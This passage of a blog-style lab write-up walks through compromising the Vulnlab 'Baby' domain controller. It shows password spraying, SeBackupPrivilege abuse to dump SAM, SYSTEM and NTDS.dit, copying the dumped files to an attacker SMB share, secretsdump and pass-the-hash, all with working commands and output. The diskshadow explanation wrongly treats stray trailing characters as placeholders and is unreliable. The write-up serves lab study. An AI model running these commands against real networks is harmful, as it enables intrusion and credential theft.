passwords, meaning if we dump these databases we can view the password for every user on the machine.\n\nSo first, let's dump both of these databases into a temporary directory.\n\n```Evil-WinRM\n*Evil-WinRM* PS C:\\Users\\Caroline.Robinson\\Documents> mkdir C:\\temp\n*Evil-WinRM* PS C:\\Users\\Caroline.Robinson\\Documents> reg save hklm\\sam c:\\temp\\sam\n*Evil-WinRM* PS C:\\Users\\Caroline.Robinson\\Documents> reg save hklm\\system c:\\temp\\system\n```\n\nThese files will now be saved to our temporary directory, in which we can download them to our local machine. This machine does have AV enabled so we won't be able to set up a simple C2 server's without obfuscating our payloads, meaning we'll need to find a way to transfer our files back and forth in a inconspicuous manner.\n\nWe can use Impacket's `smbserver` to spin up a quick SMB server, to which we can then transfer our files to our Kali machine.\n\n```Evil-WinRM -> Kali\n└─$ mkdir share/\n\n└─$ impacket-smbserver smb share/ -smb2support\n\n*Evil-WinRM* PS C:\\temp> copy sam \\\\(Kali IP)\\smb\\sam\n*Evil-WinRM* PS C:\\temp> copy system \\\\(Kali IP)\\smb\\system\n```\n\nYou'll notice a lot of output from our SMB server when we're copying the files over, this is just a built-in Impacket functionality that will dump the user's NetNTLM hash when they authenticate to our SMB server. We can ignore this, and if we look at the `share/` directory we'll see the two files that we downloaded are in this folder.\n\nNow that we have both of these files, let's run `samdump` on them to retrieve credentials that are within these two databases.\n\n```Kali\n└─$ samdump2 system sam\nAdministrator:500:aad3b435b51404eeaad3b435b51404ee:[...snip...]:::\n*disabled* Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::\n*disabled* :503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::\n*disabled* ä:504:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::\n```\n\nNow that we have the Administrator's hash, let's test the creds once more with `crackmapexec` and by passing the hash to it.\n\n```Kali\n└─$ crackmapexec winrm BabyDC.baby.vl -u 'Administrator' -H '[...snip...]'\nSMB         BabyDC.baby.vl  5985   BABYDC           [*] Windows Server 2022 Build 20348 (name:BABYDC) (domain:baby.vl)\nHTTP        BabyDC.baby.vl  5985   BABYDC           [*] http://BabyDC.baby.vl:5985/wsman\nWINRM       BabyDC.baby.vl  5985   BABYDC           [-] baby.vl\\Administrator:[...snip...]\n```\n\nThe thing is, this will fail. The Administrator hash above is not an Administrator hash that we can login with. There is a hash of an account with the same username on the DC, meaning we'll need to look a little further with our `SeBackupPrivilege` to dump another file.\n\n# Diskshadow/Robocopy for NTDS.dit\n\nThe file in particular that we're looking for is a copy of the `C:\\`'s ntds database, which stores Active Directory information of the respective filesystem path. We can use this along with our previously obtained `SAM` and `SYSTEM` databases to dump the AD secrets of the domain controller.\n\nTo exploit this, we can use `diskshadow` and `robocopy` to create a copy of the current drive and copy the copied filesystem back to the `C:\\` drive. (Credit goes to Nairuz Abulhul for their explanation of this exploit in their article [here](https://medium.com/r3d-buck3t/windows-privesc-with-sebackupprivilege-65d2cd1eb960).)\n\nLet's first create a file named `script.txt` and transfer it to our `Evil-WinRM` session. The contents of the script can be seen below.\n\n```diskshadow\nset metadata C:\\Windows\\Temp\\meta.cabX\nset context clientaccessibleX\nset context persistentX\nbegin backupX\nadd volume C: alias cdriveX\ncreateX\nexpose %cdrive% E:X\nend backupX\n```\n\n1. `set metadata C:\\Windows\\Temp\\meta.cabX`: This command is setting metadata for the backup operation. It seems to be specifying the location where metadata related to the backup will be stored, in this case, `C:\\Windows\\Temp\\meta.cabX`.\n    \n2. `set context clientaccessibleX`: This command is setting the context for the backup operation. It seems to be specifying that the backup should be accessible by the client. The `X` might be a placeholder or a variable.\n    \n3. `set context persistentX`: This command is setting another context for the backup operation. It could be specifying that the backup should be persistent, meaning it should remain available or stored for a certain period. The `X` might be a placeholder or a variable.\n    \n4. `begin backupX`: This command is initiating the backup operation. The `X` might be a placeholder or a variable.\n    \n5. `add volume C: alias cdriveX`: This command is adding the volume `C:` to the backup operation with an alias `cdriveX`. This means that the contents of the `C:` drive will be included in the backup. The `X` might be a placeholder or a variable.\n    \n6. `createX`: This command is creating something related to the backup operation. It's not entirely clear what it's creating without more context or additional information about the script.\n    \n7. `expose %cdrive% E:X`: This command seems to be exposing the contents of the `C:` drive, which was added to the backup operation with the alias `cdriveX`, to a location specified by `%cdrive%` on drive `E:`. This might involve mounting the backup or making it accessible in some way. The `X` might be a placeholder or a variable.\n    \n8. `end backupX`: This command is ending the backup operation. The `X` might be a placeholder or a variable.\n\nLet's set up a simple Python server so we can curl this script to our WinRM session.\n\n```Kali\n└─$ python3 -m http.server 9001\n\n*Evil-WinRM* PS C:\\temp> curl http://(Kali IP):9001/script.txt -O script.txt\n```\n\nNext, let's run `diskshadow` to create a copy of the `C:\\` drive.\n\n```Evil-WinRM\ndiskshadow /s script.txt\n```\n\nAfter the filesystem copy finishes, it will be saved to `E:\\Windows`. This is where we can use `robocopy` to move it back to our `C:\\` drive.\n\n`robocopy /b E:\\Windows\\ntds . ntds.dit`\n\nLet's now use our SMB server on our Kali machine to download the `ntds.dit` file from the WinRM session.\n\n```Evil-WinRM\n*Evil-WinRM* PS C:\\temp> copy ntds.dit \\\\10.8.0.173\\smb\\ntds.dit\n```\n\nFrom here, all that's left to do is retrieve the correct NTLM hashes by dumping the DC secrets with `impacket-secretsdump`.\n\n```Kali\nimpacket-secretsdump -sam sam -system system -ntds ntds.dit LOCAL\nImpacket v0.12.0.dev1 - Copyright 2023 Fortra\n\nAdministrator:500:aad3b435b51404eeaad3b435b51404ee:[...snip...]:::\nGuest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::\nBABYDC$:1000:aad3b435b51404eeaad3b435b51404ee:[...snip...]:::\n```\n\nThis will dump the NTLM hashes for every user that has the ability to login to a service on the domain controller. At the bottom of the output, you'll find hashes for all of the AD users that we dumped through LDAP at the beginning of this machine.\n\nUnderneath `[*] Reading and decrypting hashes from ntds.dit`, we'll find the correct NTLM hash for the Administrator user. We can verify our ability to connect with this using `crackmapexec` once more.\n\n```Kali\n└─$ crackmapexec winrm BabyDC.baby.vl -u 'Administrator' -H '[...snip...]'\nSMB         BabyDC.baby.vl  5985   BABYDC           [*] Windows Server 2022 Build 20348 (name:BABYDC) (domain:baby.vl)\nHTTP        BabyDC.baby.vl  5985   BABYDC           [*] http://BabyDC.baby.vl:5985/wsman\nWINRM       BabyDC.baby.vl  5985   BABYDC           [+] baby.vl\\Administrator:[...snip...] (Pwn3d!)\n```\n\nThus, we have the ability to log in through WinRM as the Administrator. The root hash can be found within the Administrator's Desktop directory.\n\n![image2](/images/vulnlab/baby-vl/c.png \"C\")\n\n# Conclusion\n\nThis means we have rooted this machine! Credit goes to xct for the development of this machine. As said previously, this machine is really helpful if you want to learn Active Directory basics.\n\n# Resources\n\nhttps://lonewolf.my.site.com/s/article/DPN-Reset-Samba-Passwords#:~:text=At%20the%20%23%20prompt%20type%20in,is%20to%20reset%20the%20password.&text=To%20set%20up%20a%20new,will%20ask%20for%20the%20password\nhttps://github.com/BishopFox/sliver\nhttps://medium.com/r3d-buck3t/windows-privesc-with-sebackupprivilege-65d2cd1eb960\n\n\n","slug":"baby-vl","published":1,"updated":"2024-06-04T21:32:23.465Z","_id":"clx0t67qs0001t5uf01d6aobz","comments":1,"layout":"post","photos":[],"content":"<p>This machine is a more beginner-level Active Directory machine, however it’s very useful if you want to understand fundamentals of AD and how to exploit it. You’ll see a lot of techniques here in more difficult machines (though they may be used differently).</p>\n<h1 id=\"Enumeration\"><a href=\"#Enumeration\" class=\"headerlink\" title=\"Enumeration\"></a>Enumeration</h1><p>With that, let’s run our base NMAP scan.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-05-29 17:18 EDT</span><br><span class=\"line\">Nmap scan report for 10.10.99.70</span><br><span class=\"line\">Host is up (0.11s latency).</span><br><span class=\"line\">Not shown: 987 filtered tcp ports (no-response)</span><br><span class=\"line\">PORT     STATE SERVICE</span><br><span class=\"line\">53/tcp   open  domain</span><br><span class=\"line\">88/tcp   open  kerberos-sec</span><br><span class=\"line\">135/tcp  open  msrpc</span><br><span class=\"line\">139/tcp  open  netbios-ssn</span><br><span class=\"line\">389/tcp  open  ldap</span><br><span class=\"line\">445/tcp  open  microsoft-ds</span><br><span class=\"line\">464/tcp  open  kpasswd5</span><br><span class=\"line\">593/tcp  open  http-rpc-epmap</span><br><span class=\"line\">636/tcp  open  ldapssl</span><br><span class=\"line\">3268/tcp open  globalcatLDAP</span><br><span class=\"line\">3269/tcp open  globalcatLDAPssl</span><br><span class=\"line\">3389/tcp open  ms-wbt-server</span><br><span class=\"line\">5357/tcp open  wsdapi</span><br><span class=\"line\"></span><br><span class=\"line\">Nmap done: 1 IP address (1 host up) scanned in 17.63 seconds</span><br></pre></td></tr></table></figure>\n\n<p>You’ll see that we have a few ports to look at initially, notably SMB and LDAP. There is no initial web service, so we’ll check out the former ports. Let’s run another NMAP scan against the LDAP service so we can grab the NetBIOS name and FQDN of the machine.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">└─$ sudo nmap 10.10.99.70 -A</span><br><span class=\"line\"></span><br><span class=\"line\">3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: baby.vl0., Site: Default-First-Site-Name)</span><br><span class=\"line\">|   DNS_Computer_Name: BabyDC.baby.vl</span><br><span class=\"line\">| ssl-cert: Subject: commonName=BabyDC.baby.vl</span><br></pre></td></tr></table></figure>\n\n<p>Let’s add these to our <code>/etc/hosts</code> file so we can resolve any future enumeration techniques to the correct DNS name. Furthermore, attempting to authenticate to SMB seems to not return anything in particular.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">└─$ smbclient -L 10.10.99.70 -N</span><br><span class=\"line\">Anonymous login successful</span><br><span class=\"line\"></span><br><span class=\"line\">        Sharename       Type      Comment</span><br><span class=\"line\">        ---------       ----      -------</span><br><span class=\"line\">Reconnecting with SMB1 for workgroup listing.</span><br><span class=\"line\">do_connect: Connection to 10.10.99.70 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)</span><br><span class=\"line\">Unable to connect with SMB1 -- no workgroup available</span><br></pre></td></tr></table></figure>\n\n<p>SMB does not seem to be helpful as of right now, so let’s try to focus on LDAP. Normally, it’s an extremely insecure practice to allow null LDAP enumeration. That being said, there’s no harm in trying to run a few queries with LDAP to test for any responses.</p>\n<h1 id=\"LDAP-Enumeration\"><a href=\"#LDAP-Enumeration\" class=\"headerlink\" title=\"LDAP Enumeration\"></a>LDAP Enumeration</h1><p>Let’s first test for null authentication and query LDAP for all domain objects in the domain.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">└─$ ldapsearch -x -H ldap://BabyDC.baby.vl:389 -D &#x27;&#x27; -w &#x27;&#x27; -b &quot;DC=baby,DC=vl&quot;</span><br><span class=\"line\"></span><br><span class=\"line\"># extended LDIF</span><br><span class=\"line\">#</span><br><span class=\"line\"># LDAPv3</span><br><span class=\"line\"># base &lt;DC=baby,DC=vl&gt; with scope subtree</span><br><span class=\"line\"># filter: (objectclass=*)</span><br><span class=\"line\"># requesting: ALL</span><br><span class=\"line\">#</span><br><span class=\"line\"></span><br><span class=\"line\"># baby.vl</span><br><span class=\"line\">dn: DC=baby,DC=vl</span><br><span class=\"line\"></span><br><span class=\"line\"># Administrator, Users, baby.vl</span><br><span class=\"line\">dn: CN=Administrator,CN=Users,DC=baby,DC=vl</span><br><span class=\"line\">[...snip...]</span><br></pre></td></tr></table></figure>\n\n<p>You can see from the result that all of the domain objects were returned, meaning that we are able to query LDAP for essentially any domain object we’d like. If we were on a Windows workstation that was within the domain, we could use tools like <code>ADSearch</code> or <code>PowerView</code> to query for any users, groups, essentially any domain object we’d like.</p>\n<p>Let’s adjust our LDAP search query so we can create a user list.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">└─$ ldapsearch -x -H ldap://BabyDC.baby.vl:389 -D &#x27;&#x27; -w &#x27;&#x27; -b &quot;DC=baby,DC=vl&quot; | grep &#x27;@baby.vl&#x27; | awk &#x27;&#123;print $2&#125;&#x27; | cut -d &#x27;@&#x27; -f 1 &gt; ul.txt; cat ul.txt</span><br><span class=\"line\"></span><br><span class=\"line\">Jacqueline.Barnett</span><br><span class=\"line\">Ashley.Webb</span><br><span class=\"line\">Hugh.George</span><br><span class=\"line\">Leonard.Dyer</span><br><span class=\"line\">Connor.Wilkinson</span><br><span class=\"line\">Joseph.Hughes</span><br><span class=\"line\">Kerry.Wilson</span><br><span class=\"line\">Teresa.Bell</span><br></pre></td></tr></table></figure>\n\n<p>I was getting ready to run some tests using this wordlist, but if you do a quick check over the LDAP dump you’ll see that we missed a few users. I wasn’t certain if this was an LDAP issue or a <code>grep</code> issue, but nonetheless I copied the remaining users into the wordlist. (<code>Caroline.Robinson</code> and <code>Ian.Walker</code>)</p>\n<p>You’ll notice at the end of the same full LDAP dump output under <code>Teresa.Bell</code>, there seems to be a description comment that says <code>description: Set initial password to [...snip...</code>.</p>\n<p>We can infer based on the message that this is the initial password for users when they are created. Now that we have a list of users and a potential password, we can use <code>crackmapexec</code> to test if any users have this password still set to their account. We’ll use SMB as our service to test against since we really don’t need to query anything for LDAP anymore (since we can already dump the entire domain with null credentials).</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">└─$ for user in $(cat ul.txt); do crackmapexec smb BabyDC.baby.vl -u $user -p &#x27;BabyStart123!&#x27;; done</span><br><span class=\"line\"></span><br><span class=\"line\">[...snip...]</span><br><span class=\"line\">SMB         BabyDC.baby.vl  445    BABYDC           [-] baby.vl\\Caroline.Robinson:[...snip...] STATUS_PASSWORD_MUST_CHANGE</span><br><span class=\"line\">[...snip...]</span><br></pre></td></tr></table></figure>\n\n<p>You’ll notice that we’ll get a hit on <code>Caroline.Robinson</code>, stating that their password needs to change. This more than likely is notifying us that the user has not done their initial authentication to the domain yet or that they have gone past the password reset policy deadline. This can be the case with new employees and&#x2F;or interns.</p>\n<h1 id=\"Password-Reset-with-SMBPasswd\"><a href=\"#Password-Reset-with-SMBPasswd\" class=\"headerlink\" title=\"Password Reset with SMBPasswd\"></a>Password Reset with SMBPasswd</h1><p>In that case let’s try to reset their password with <code>smbpasswd</code>. The only pre-reqs to this is that we specify the username and the specific remote machine we want to change it for.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">smbpasswd -r BabyDC.baby.vl -U BABYDC/&#x27;Caroline.Robinson&#x27;</span><br><span class=\"line\"></span><br><span class=\"line\">Old SMB password: ([...snip...])</span><br><span class=\"line\">New SMB password: password123@</span><br><span class=\"line\">Retype new SMB password: password123@</span><br><span class=\"line\">Password changed for user Caroline.Robinson</span><br></pre></td></tr></table></figure>\n\n<p>If we test the same <code>crackmapexec</code> command as above for <code>Caroline.Robinson</code>, we can see that their password was successfully updated. Normally I’d now dump the LDAP with bloodhound to get all of the domain objects into a GUI, but if we test <code>crackmapexec</code> against WinRM we can see that we already are able to login as this user.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">└─$ crackmapexec winrm BabyDC.baby.vl -u &#x27;Caroline.Robinson&#x27; -p &#x27;password123@&#x27;</span><br><span class=\"line\">SMB         BabyDC.baby.vl  5985   BABYDC           [*] Windows Server 2022 Build 20348 (name:BABYDC) (domain:baby.vl)</span><br><span class=\"line\">HTTP        BabyDC.baby.vl  5985   BABYDC           [*] http://BabyDC.baby.vl:5985/wsman</span><br><span class=\"line\">WINRM       BabyDC.baby.vl  5985   BABYDC           [+] baby.vl\\Caroline.Robinson:password123@ (Pwn3d!)</span><br></pre></td></tr></table></figure>\n\n<p>After logging in, you can find the user flag within the user’s Desktop directory.</p>\n<p><img src=\"/images/vulnlab/baby-vl/b.png\" alt=\"image1\" title=\"B\"></p>\n<h1 id=\"Privilege-Escalation-w-SeBackupPrivilege\"><a href=\"#Privilege-Escalation-w-SeBackupPrivilege\" class=\"headerlink\" title=\"Privilege Escalation w&#x2F; SeBackupPrivilege\"></a>Privilege Escalation w&#x2F; SeBackupPrivilege</h1><p>Let’s do a quick privilege to see if there’s anything that we can exploit.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">*Evil-WinRM* PS C:\\Users\\Caroline.Robinson\\Documents&gt; whoami /priv</span><br><span class=\"line\"></span><br><span class=\"line\">Privilege Name                Description                    State</span><br><span class=\"line\">============================= ============================== =======</span><br><span class=\"line\">SeMachineAccountPrivilege     Add workstations to domain     Enabled</span><br><span class=\"line\">SeBackupPrivilege             Back up files and directories  Enabled</span><br><span class=\"line\">SeRestorePrivilege            Restore files and directories  Enabled</span><br><span class=\"line\">[...snip...]</span><br></pre></td></tr></table></figure>\n\n<p>You’ll see from the output that we have <code>SeBackupPrivilege</code> enabled for our user. This essentially means that we can backup various parts of the filesystem. In most cases, this can be for a engineer or technical support user and seems harmless at first glance. However, this means we can also backup sensitive files such as the <code>SAM</code> and <code>SYSTEM</code> databases. These database essentially house user accounts and security objects for all domain objects on the machine. The only issue is that this also houses user passwords, meaning if we dump these databases we can view the password for every user on the machine.</p>\n<p>So first, let’s dump both of these databases into a temporary directory.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">*Evil-WinRM* PS C:\\Users\\Caroline.Robinson\\Documents&gt; mkdir C:\\temp</span><br><span class=\"line\">*Evil-WinRM* PS C:\\Users\\Caroline.Robinson\\Documents&gt; reg save hklm\\sam c:\\temp\\sam</span><br><span class=\"line\">*Evil-WinRM* PS C:\\Users\\Caroline.Robinson\\Documents&gt; reg save hklm\\system c:\\temp\\system</span><br></pre></td></tr></table></figure>\n\n<p>These files will now be saved to our temporary directory, in which we can download them to our local machine. This machine does have AV enabled so we won’t be able to set up a simple C2 server’s without obfuscating our payloads, meaning we’ll need to find a way to transfer our files back and forth in a inconspicuous manner.</p>\n<p>We can use Impacket’s <code>smbserver</code> to spin up a quick SMB server, to which we can then transfer our files to our Kali machine.</p>\n<figure class=\"highlight plaintext\"><figcaption><span>-> Kali</span></figcaption><table><tr><td class=\"code\"><pre><span class=\"line\">└─$ mkdir share/</span><br><span class=\"line\"></span><br><span class=\"line\">└─$ impacket-smbserver smb share/ -smb2support</span><br><span class=\"line\"></span><br><span class=\"line\">*Evil-WinRM* PS C:\\temp&gt; copy sam \\\\(Kali IP)\\smb\\sam</span><br><span class=\"line\">*Evil-WinRM* PS C:\\temp&gt; copy system \\\\(Kali IP)\\smb\\system</span><br></pre></td></tr></table></figure>\n\n<p>You’ll notice a lot of output from our SMB server when we’re copying the files over, this is just a built-in Impacket functionality that will dump the user’s NetNTLM hash when they authenticate to our SMB server. We can ignore this, and if we look at the <code>share/</code> directory we’ll see the two files that we downloaded are in this folder.</p>\n<p>Now that we have both of these files, let’s run <code>samdump</code> on them to retrieve credentials that are within these two databases.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">└─$ samdump2 system sam</span><br><span class=\"line\">Administrator:500:aad3b435b51404eeaad3b435b51404ee:[...snip...]:::</span><br><span class=\"line\">*disabled* Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</span><br><span class=\"line\">*disabled* :503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</span><br><span class=\"line\">*disabled* ä:504:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</span><br></pre></td></tr></table></figure>\n\n<p>Now that we have the Administrator’s hash, let’s test the creds once more with <code>crackmapexec</code> and by passing the hash to it.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">└─$ crackmapexec winrm BabyDC.baby.vl -u &#x27;Administrator&#x27; -H &#x27;[...snip...]&#x27;</span><br><span class=\"line\">SMB         BabyDC.baby.vl  5985   BABYDC           [*] Windows Server 2022 Build 20348 (name:BABYDC) (domain:baby.vl)</span><br><span class=\"line\">HTTP        BabyDC.baby.vl  5985   BABYDC           [*] http://BabyDC.baby.vl:5985/wsman</span><br><span class=\"line\">WINRM       BabyDC.baby.vl  5985   BABYDC           [-] baby.vl\\Administrator:[...snip...]</span><br></pre></td></tr></table></figure>\n\n<p>The thing is, this will fail. The Administrator hash above is not an Administrator hash that we can login with. There is a hash of an account with the same username on the DC, meaning we’ll need to look a little further with our <code>SeBackupPrivilege</code> to dump another file.</p>\n<h1 id=\"Diskshadow-Robocopy-for-NTDS-dit\"><a href=\"#Diskshadow-Robocopy-for-NTDS-dit\" class=\"headerlink\" title=\"Diskshadow&#x2F;Robocopy for NTDS.dit\"></a>Diskshadow&#x2F;Robocopy for NTDS.dit</h1><p>The file in particular that we’re looking for is a copy of the <code>C:\\</code>‘s ntds database, which stores Active Directory information of the respective filesystem path. We can use this along with our previously obtained <code>SAM</code> and <code>SYSTEM</code> databases to dump the AD secrets of the domain controller.</p>\n<p>To exploit this, we can use <code>diskshadow</code> and <code>robocopy</code> to create a copy of the current drive and copy the copied filesystem back to the <code>C:\\</code> drive. (Credit goes to Nairuz Abulhul for their explanation of this exploit in their article <a href=\"https://medium.com/r3d-buck3t/windows-privesc-with-sebackupprivilege-65d2cd1eb960\">here</a>.)</p>\n<p>Let’s first create a file named <code>script.txt</code> and transfer it to our <code>Evil-WinRM</code> session. The contents of the script can be seen below.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">set metadata C:\\Windows\\Temp\\meta.cabX</span><br><span class=\"line\">set context clientaccessibleX</span><br><span class=\"line\">set context persistentX</span><br><span class=\"line\">begin backupX</span><br><span class=\"line\">add volume C: alias cdriveX</span><br><span class=\"line\">createX</span><br><span class=\"line\">expose %cdrive% E:X</span><br><span class=\"line\">end backupX</span><br></pre></td></tr></table></figure>\n\n<ol>\n<li><p><code>set metadata C:\\Windows\\Temp\\meta.cabX</code>: This command is setting metadata for the backup operation. It seems to be specifying the location where metadata related to the backup will be stored, in this case, <code>C:\\Windows\\Temp\\meta.cabX</code>.</p>\n</li>\n<li><p><code>set context clientaccessibleX</code>: This command is setting the context for the backup operation. It seems to be specifying that the backup should be accessible by the client. The <code>X</code> might be a placeholder or a variable.</p>\n</li>\n<li><p><code>set context persistentX</code>: This command is setting another context for the backup operation. It could be specifying that the backup should be persistent, meaning it should remain available or stored for a certain period. The <code>X</code> might be a placeholder or a variable.</p>\n</li>\n<li><p><code>begin backupX</code>: This command is initiating the backup operation. The <code>X</code> might be a placeholder or a variable.</p>\n</li>\n<li><p><code>add volume C: alias cdriveX</code>: This command is adding the volume <code>C:</code> to the backup operation with an alias <code>cdriveX</code>. This means that the contents of the <code>C:</code> drive will be included in the backup. The <code>X</code> might be a placeholder or a variable.</p>\n</li>\n<li><p><code>createX</code>: This command is creating something related to the backup operation. It’s not entirely clear what it’s creating without more context or additional information about the script.</p>\n</li>\n<li><p><code>expose %cdrive% E:X</code>: This command seems to be exposing the contents of the <code>C:</code> drive, which was added to the backup operation with the alias <code>cdriveX</code>, to a location specified by <code>%cdrive%</code> on drive <code>E:</code>. This might involve mounting the backup or making it accessible in some way. The <code>X</code> might be a placeholder or a variable.</p>\n</li>\n<li><p><code>end backupX</code>: This command is ending the backup operation. The <code>X</code> might be a placeholder or a variable.</p>\n</li>\n</ol>\n<p>Let’s set up a simple Python server so we can curl this script to our WinRM session.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">└─$ python3 -m http.server 9001</span><br><span class=\"line\"></span><br><span class=\"line\">*Evil-WinRM* PS C:\\temp&gt; curl http://(Kali IP):9001/script.txt -O script.txt</span><br></pre></td></tr></table></figure>\n\n<p>Next, let’s run <code>diskshadow</code> to create a copy of the <code>C:\\</code> drive.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">diskshadow /s script.txt</span><br></pre></td></tr></table></figure>\n\n<p>After the filesystem copy finishes, it will be saved to <code>E:\\Windows</code>. This is where we can use <code>robocopy</code> to move it back to our <code>C:\\</code> drive.</p>\n<p><code>robocopy /b E:\\Windows\\ntds . ntds.dit</code></p>\n<p>Let’s now use our SMB server on our Kali machine to download the <code>ntds.dit</code> file from the WinRM session.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">*Evil-WinRM* PS C:\\temp&gt; copy ntds.dit \\\\10.8.0.173\\smb\\ntds.dit</span><br></pre></td></tr></table></figure>\n\n<p>From here, all that’s left to do is retrieve the correct NTLM hashes by dumping the DC secrets with <code>impacket-secretsdump</code>.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">impacket-secretsdump -sam sam -system system -ntds ntds.dit LOCAL</span><br><span class=\"line\">Impacket v0.12.0.dev1 - Copyright 2023 Fortra</span><br><span class=\"line\"></span><br><span class=\"line\">Administrator:500:aad3b435b51404eeaad3b435b51404ee:[...snip...]:::</span><br><span class=\"line\">Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</span><br><span class=\"line\">BABYDC$:1000:aad3b435b51404eeaad3b435b51404ee:[...snip...]:::</span><br></pre></td></tr></table></figure>\n\n<p>This will dump the NTLM hashes for every user that has the ability to login to a service on the domain controller. At the bottom of the output, you’ll find hashes for all of the AD users that we dumped through LDAP at the beginning of this machine.</p>\n<p>Underneath <code>[*] Reading and decrypting hashes from ntds.dit</code>, we’ll find the correct NTLM hash for the Administrator user. We can verify our ability to connect with this using <code>crackmapexec</code> once more.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">└─$ crackmapexec winrm BabyDC.baby.vl -u &#x27;Administrator&#x27; -H &#x27;[...snip...]&#x27;</span><br><span class=\"line\">SMB         BabyDC.baby.vl  5985   BABYDC           [*] Windows Server 2022 Build 20348 (name:BABYDC) (domain:baby.vl)</span><br><span class=\"line\">HTTP        BabyDC.baby.vl  5985   BABYDC           [*] http://BabyDC.baby.vl:5985/wsman</span><br><span class=\"line\">WINRM       BabyDC.baby.vl  5985   BABYDC           [+] baby.vl\\Administrator:[...snip...] (Pwn3d!)</span><br></pre></td></tr></table></figure>\n\n<p>Thus, we have the ability to log in through WinRM as the Administrator. The root hash can be found within the Administrator’s Desktop directory.</p>\n<p><img src=\"/images/vulnlab/baby-vl/c.png\" alt=\"image2\" title=\"C\"></p>\n<h1 id=\"Conclusion\"><a href=\"#Conclusion\" class=\"headerlink\" title=\"Conclusion\"></a>Conclusion</h1><p>This means we have rooted this machine! Credit goes to xct for the development of this machine. As said previously, this machine is really helpful if you want to learn Active Directory basics.</p>\n<h1 id=\"Resources\"><a href=\"#Resources\" class=\"headerlink\" title=\"Resources\"></a>Resources</h1><p><a href=\"https://lonewolf.my.site.com/s/article/DPN-Reset-Samba-Passwords#:~:text=At%20the%20%23%20prompt%20type%20in,is%20to%20reset%20the%20password.&text=To%20set%20up%20a%20new,will%20ask%20for%20the%20password\">https://lonewolf.my.site.com/s/article/DPN-Reset-Samba-Passwords#:~:text=At%20the%20%23%20prompt%20type%20in,is%20to%20reset%20the%20password.&amp;text=To%20set%20up%20a%20new,will%20ask%20for%20the%20password</a><br><a href=\"https://github.com/BishopFox/sliver\">https://github.com/BishopFox/sliver</a><br><a href=\"https://medium.com/r3d-buck3t/windows-privesc-with-sebackupprivilege-65d2cd1eb960\">https://medium.com/r3d-buck3t/windows-privesc-with-sebackupprivilege-65d2cd1eb960</a></p>\n","cover_type":"img","excerpt":"","more":"<p>This machine is a more beginner-level Active Directory machine, however it’s very useful if you want to understand fundamentals of AD and how to exploit it. You’ll see a lot of techniques here in more difficult machines (though they may be used differently).</p>\n<h1 id=\"Enumeration\"><a href=\"#Enumeration\" class=\"headerlink\" title=\"Enumeration\"></a>Enumeration</h1><p>With that, let’s run our base NMAP scan.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-05-29 17:18 EDT</span><br><span class=\"line\">Nmap scan report for 10.10.99.70</span><br><span class=\"line\">Host is up (0.11s latency).</span><br><span class=\"line\">Not shown: 987 filtered tcp ports (no-response)</span><br><span class=\"line\">PORT     STATE SERVICE</span><br><span class=\"line\">53/tcp   open  domain</span><br><span class=\"line\">88/tcp   open  kerberos-sec</span><br><span class=\"line\">135/tcp  open  msrpc</span><br><span class=\"line\">139/tcp  open  netbios-ssn</span><br><span class=\"line\">389/tcp  open  ldap</span><br><span class=\"line\">445/tcp  open  microsoft-ds</span><br><span class=\"line\">464/tcp  open  kpasswd5</span><br><span class=\"line\">593/tcp  open  http-rpc-epmap</span><br><span class=\"line\">636/tcp  open  ldapssl</span><br><span class=\"line\">3268/tcp open  globalcatLDAP</span><br><span class=\"line\">3269/tcp open  globalcatLDAPssl</span><br><span class=\"line\">3389/tcp open  ms-wbt-server</span><br><span class=\"line\">5357/tcp open  wsdapi</span><br><span class=\"line\"></span><br><span class=\"line\">Nmap done: 1 IP address (1 host up) scanned in 17.63 seconds</span><br></pre></td></tr></table></figure>\n\n<p>You’ll see that we have a few ports to look at initially, notably SMB and LDAP. There is no initial web service, so we’ll check out the former ports. Let’s run another NMAP scan against the LDAP service so we can grab the NetBIOS name and FQDN of the machine.</p>\n<figure class=\"highlight plaintext\"><table><tr><td 